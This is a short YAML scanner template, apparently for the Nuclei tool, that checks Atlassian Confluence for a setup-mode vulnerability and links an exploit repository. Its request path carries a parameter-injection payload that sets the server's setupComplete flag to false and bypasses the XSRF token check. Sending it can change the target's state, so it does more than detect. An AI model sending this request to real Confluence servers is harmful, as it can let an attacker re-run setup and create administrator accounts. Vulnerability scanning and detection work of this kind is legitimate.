id: confluence-setup-mode-check

info:
  name: Confluence Setup Mode Vulnerability Check
  author: rdnt
  severity: high
  description: Check if Confluence instance is in 'Setup Successful' mode, indicative of a potential vulnerability allowing unauthorized setup completion or account creation.
  reference:
    - https://github.com/AIex-3/confluence-hack/blob/main/exploit.py
  tags: confluence,vulnerability,setup

requests:
  - method: GET
    path:
      - "{{BaseURL}}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"

    headers:
      X-Atlassian-Token: "no-check"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "success" # this exploit needs credentials to work
        part: body
        condition: or

      - type: status
        status:
          - 200


